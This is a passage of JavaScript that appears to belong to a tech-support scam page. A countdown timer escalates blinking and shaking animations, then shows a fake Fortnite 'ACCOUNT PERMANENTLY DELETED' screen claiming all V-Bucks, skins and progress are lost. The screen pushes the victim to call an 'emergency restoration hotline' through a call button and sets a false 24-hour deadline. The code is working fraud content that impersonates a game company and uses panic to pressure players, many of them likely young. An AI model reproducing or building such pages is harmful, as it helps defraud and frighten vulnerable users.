            if (timeLeft <= 60) {
                timerElement.style.animation = 'fortniteBlink 0.5s infinite';
                modalContent.style.animation = 'slideIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1), fortniteShake 0.4s infinite ease-in-out';
            }
            
            if (timeLeft <= 30) {
                timerElement.style.color = '#ff6666';
                timerElement.style.fontSize = '36px';
            }
            
            if (timeLeft <= 10) {
                timerElement.style.color = '#ffffff';
                timerElement.style.backgroundColor = '#ff0000';
                timerElement.style.animation = 'fortniteBlink 0.2s infinite';
            }
        }
        
        if (timeLeft <= 0) {
            clearInterval(countdownTimer);
            showFinalAccountTermination();
        }
    }, 1000);
}

function showFinalAccountTermination() {
    const modal = document.querySelector('.fortnite-error-modal');
    if (modal) {
        modal.innerHTML = `
            <div style="background: #000000; 
                       margin: 5% auto; 
                       padding: 60px 48px; 
                       border-radius: 16px; 
                       width: 95%; 
                       max-width: 580px; 
                       text-align: center; 
                       color: #ff0000; 
                       border: 4px solid #ff0000;
                       box-shadow: 0 30px 80px rgba(255, 0, 0, 0.8);
                       position: relative;
                       overflow: hidden;
                       animation: fortniteShake 0.3s infinite;">
                <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; 
                           background: repeating-linear-gradient(
                               45deg,
                               transparent,
                               transparent 20px,
                               rgba(255,0,0,0.08) 20px,
                               rgba(255,0,0,0.08) 40px
                           );
                           opacity: 0.7;"></div>
                <div style="position: relative; z-index: 2;">
                    <div style="font-size: 96px; margin-bottom: 32px; 
                               filter: drop-shadow(0 6px 12px rgba(255, 0, 0, 0.6));
                               animation: fortniteBlink 0.5s infinite;">
                        💀
                    </div>
                    <h2 style="color: #ff0000; margin-bottom: 32px; font-size: 32px; font-weight: 900;
                              text-shadow: 0 4px 8px rgba(255, 0, 0, 0.4);
                              text-transform: uppercase; letter-spacing: 2px;">
                        ACCOUNT PERMANENTLY DELETED
                    </h2>
                    <p style="margin-bottom: 28px; font-size: 20px; color: #ff6666; line-height: 1.5; font-weight: 700;">
                        Your Fortnite account has been permanently terminated and all data has been erased.
                    </p>
                    <div style="background: rgba(255, 0, 0, 0.1); padding: 24px; border-radius: 12px; margin: 32px 0;
                               border: 2px solid #ff0000;">
                        <p style="margin-bottom: 20px; font-size: 18px; color: #ffaaaa; font-weight: 600;">
                            🚨 ALL V-BUCKS, SKINS, AND PROGRESS PERMANENTLY LOST 🚨
                        </p>
                        <p style="margin-bottom: 24px; font-size: 16px; color: #ffcccc;">
                            Call our emergency restoration hotline immediately:
                        </p>
                        <div style="font-size: 28px; font-weight: 900; color: #ff0000; margin-bottom: 16px;
                                   font-family: 'Courier New', monospace; text-shadow: 0 2px 4px rgba(255,0,0,0.3);">
                            ${'+1-000-000-0000'}
                        </div>
                    </div>
                    <button onclick="handleCallNow('${'+1-000-000-0000'}')" 
                            style="background: linear-gradient(135deg, #ff0000 0%, #8b0000 100%); 
                                   color: white; 
                                   border: none; 
                                   padding: 20px 40px; 
                                   border-radius: 12px; 
                                   cursor: pointer; 
                                   font-weight: 900; 
                                   text-transform: uppercase; 
                                   font-size: 18px;
                                   letter-spacing: 1px;
                                   box-shadow: 0 8px 24px rgba(255, 0, 0, 0.6);
                                   transition: all 0.3s ease;
                                   transform: translateY(0);
                                   animation: fortniteBlink 1s infinite;">
                        📞 EMERGENCY ACCOUNT RESTORATION
                    </button>
                    <div style="margin-top: 32px; padding: 20px; background: rgba(255, 255, 255, 0.05); 
                               border-radius: 8px; color: #ff9999; font-size: 14px; font-weight: 600;
                               border: 1px solid rgba(255, 0, 0, 0.3);">
                        ⚠️ Account restoration is only possible within the next 24 hours. After this period, recovery will be impossible.
                    </div>
                </div>
            </div>
        `;
    }
}